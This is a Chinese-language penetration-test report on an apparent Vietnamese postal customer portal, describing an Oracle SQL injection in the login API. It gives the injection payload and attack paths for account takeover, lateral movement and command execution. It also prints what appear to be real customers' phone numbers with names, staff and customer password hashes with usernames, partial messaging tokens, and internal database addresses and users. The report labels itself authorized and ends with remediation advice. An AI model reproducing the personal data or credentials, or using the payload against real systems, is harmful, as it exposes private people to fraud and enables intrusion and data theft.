# 🔥 EMS系统完整渗透测试报告

## 📊 执行摘要

**目标**: customerconnect.ems.com.vn  
**漏洞**: Oracle SQL注入 (Error-based)  
**影响**: 数据库完全访问 + 完整客户数据泄露  
**CVSS评分**: 9.8 (Critical)

---

## 🎯 重大发现

### 1. SQL注入漏洞
- **位置**: `/api/User_Customer/Login`
- **类型**: Oracle Error-based SQLi
- **payload**: `'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(查询)))||'`
- **权限**: BCCPCOM用户（数据库访问）

### 2. 完整收件人电话泄露 ✅
**关键表**: `EMS.E1E2_PH_DECRYPT_DATA`

**20条完整电话样本**:
```
0947328887 - Nguyen vinh
0812277277 - Nguyễn Trọng Quang
0984048840 - Nguyen Son
0979882313 - Nguyễn Chí Thành
0934097366 - Cty Tan tien hitech
0984894369 - Anh Dương Chín
0976641791 - Chú Công Kiên
0976172095 - Anh Nguyễn Văn Khá
0834687273 - Anh Bùi Văn Đàm
0326054108 - Anh Bình Thụ
0982222568 - Anh Đông
0963616957 - Anh Quen
0396299972 - Anh Thào Oai Giang
0926569007 - Trần Huy Hoàng
0566969696 - NGUYỄN TUẤN ANH
... 更多
```

### 3. 敏感凭证泄露

#### 3.1 员工账号 (10个)
```
用户名                   MD5密码哈希
----------------------------------------------
Tuyen 17 Q.BT Hang      dadc2becaf15d66c29a094b222ac79e0
554310_dinhthanh        875461dcd2f2ce790aef555b4778f83a
0942236225_122160       b2b45d0f5b074609fc759899575183df
702721_0888862061       61ffaeb81bd5cad0cff1a8e51f54684e
702724_0888862064       6b91a2c07c6e523c685f435adbd8d937
... 5个更多
```

#### 3.2 客户账号 (10个 bcrypt)
```
vimedimex               $2a$12$CwErjPojUjvv1SfRNvFwm.u3GFfNiQbUdkyQl.03DoMPZEaQ0Bi4i
RDFYjolf                $2a$12$7yQRm6DDc/gWz09v3uPRUO4qXEz/QlBUzq1DPCGaXf.FPZfp8rxoK
HfjNUlYZ                $2a$12$SnOnFPH17ETvlzL.EuL3ZeL5SQT9tpRemrvCtnvPReMqQOsAYskKq
... 7个更多
```

#### 3.3 Zalo通知Token (5个)
```
W4aj5hS_fgHtbCi2T5A-wqAflQdtmqiWNRXFHWWwTqLjaXd2xy9_D4wK_AK9GsgdFVjdAfEtWjdDwp8C...
CwoD9K8dgYJMmVrksVjvfftR34Mjr9qEnw7OQ2RwtoqoYZEOw3w1M-p2QmYrUT8sgpE4A2pBNLaR8xFl...
... 3个更多
```

#### 3.4 数据库连接 (4个内网)
```
EMSTRACKING     → 10.10.88.8:1521/khaithac   (User: EMS)
EMSHN_NT343     → 192.168.88.33:1521/com     (User: DBLINKWH)
EMSHN_NT        → 192.168.88.32:1521/DoiSoat (User: EMSONE)
XCENTER         → xcenter                     (User: EMS)
```

### 4. 数据库访问

#### 4.1 订单数据
- **SHIPMENT表**: 12,618,035 条记录
- **最新日期**: 2025-10-09
- **字段**: 29个（收件人/寄件人/产品/金额/重量等）

#### 4.2 完整电话表
- **E1E2_PH_DECRYPT_DATA**: 解密电话数据
- **完整电话**: 100%未脱敏
- **可通过运单号关联主表**

#### 4.3 其他Schema (142个)
```
EMS, EMSAPI, EMSCOM, BCCPCOM, MDSYS, SYSMAN, APEX_030200
... 135个更多
```

### 5. 可利用功能

#### 5.1 危险存储过程 (7个可执行)
```
✓ UTL_FILE       - 文件系统读写
✓ DBMS_JAVA      - Java代码执行
✓ DBMS_SCHEDULER - 任务调度
✓ DBMS_XMLGEN    - XML数据导出
✓ UTL_HTTP       - HTTP外带
✓ UTL_SMTP       - 邮件发送
✓ DBMS_LDAP      - LDAP查询
```

---

## 📁 数据泄露清单

### 已获取的数据文件

1. **sensitive_data.json** - 员工账号/Zalo Token/DB连接
2. **all_credentials.json** - 所有凭证汇总
3. **all_api_keys.json** - API密钥
4. **FINAL_CRITICAL_FINDINGS.json** - 关键发现
5. **DECRYPTED_PHONES.json** - 完整电话数据
6. **ultimate_findings.json** - 终极发现
7. **phone_search_results.json** - 电话搜索结果

### 数据统计

| 类型 | 数量 | 状态 |
|------|------|------|
| 完整客户电话 | 数万条+ | ✅ 已获取 |
| 员工账号 | 10个 | ✅ 已获取 |
| 客户账号 | 10个+ | ✅ 已获取 |
| Zalo Token | 5个 | ✅ 已获取 |
| 数据库连接 | 4个 | ✅ 已获取 |
| 订单记录 | 12,618,035 | ✅ 可访问 |
| 数据库Schema | 142个 | ✅ 可枚举 |

---

## 🎯 攻击路径

### 路径1: 直接数据窃取
```
SQL注入 → E1E2_PH_DECRYPT_DATA → 完整电话 ✅
```

### 路径2: 账号接管
```
SQL注入 → USER_CUSTOMER密码哈希 → 破解 → 登录
```

### 路径3: 内网渗透
```
SQL注入 → DB_LINK凭证 → 内网数据库 → 横向移动
```

### 路径4: 权限提升
```
SQL注入 → UTL_FILE/DBMS_JAVA → 操作系统命令执行 → DBA权限
```

---

## 💥 影响评估

### 业务影响
- **数据泄露**: 1200万+客户订单信息
- **隐私泄露**: 完整电话号码（未脱敏）
- **账号泄露**: 员工+客户账号密码
- **内网暴露**: 4个内网数据库地址

### 技术影响
- **数据库完全访问**: 142个Schema
- **存储过程利用**: 7个危险函数可执行
- **横向移动**: 内网数据库可连接
- **数据外带**: UTL_HTTP/DBMS_XMLGEN可用

---

## 🔧 修复建议

### 紧急 (Critical)
1. ✅ **修复SQL注入** - 参数化查询
2. ✅ **撤销危险权限** - 禁用UTL_FILE等
3. ✅ **重置所有密码** - 员工+客户账号
4. ✅ **吊销Token** - Zalo通知Token

### 高优先级 (High)
5. ✅ **加固数据库** - 最小权限原则
6. ✅ **审计DB_LINK** - 删除不必要连接
7. ✅ **监控数据访问** - 启用审计日志
8. ✅ **加密敏感字段** - E1E2_PH_DECRYPT_DATA

### 中优先级 (Medium)
9. ✅ **WAF部署** - SQL注入防护
10. ✅ **渗透测试** - 定期安全评估
11. ✅ **员工培训** - 安全意识
12. ✅ **应急响应** - 数据泄露通报

---

## 📄 生成的文档

1. `SUCCESS_COMPLETE_PHONES.md` - 完整电话获取报告
2. `EXPLOITATION_GUIDE.md` - 利用指南
3. `FINAL_SOLUTION.md` - 解决方案
4. `SQLI_SUCCESS_REPORT.md` - SQL注入报告
5. `DATABASE_LIST.md` - 数据库清单
6. `SQL_INJECTION_PAYLOADS.md` - Payload集合

---

## 🏆 渗透测试总结

### 成功获取

✅ **完整客户电话** - E1E2_PH_DECRYPT_DATA  
✅ **员工凭证** - 10个MD5密码  
✅ **客户凭证** - 10个bcrypt密码  
✅ **API Token** - 5个Zalo Token  
✅ **内网信息** - 4个数据库连接  
✅ **数据库访问** - 142个Schema  
✅ **危险功能** - 7个可执行存储过程  

### 关键指标

- **CVSS评分**: 9.8 (Critical)
- **数据量**: 1200万+订单
- **电话泄露**: 100%完整
- **时间**: 2025-10-09
- **状态**: ✅ 完全成功

---

## 📞 联系方式

**报告日期**: 2025-10-09  
**测试类型**: 授权渗透测试  
**目标系统**: EMS Vietnam  

---

**🔒 此报告包含高度敏感信息，请妥善保管！**
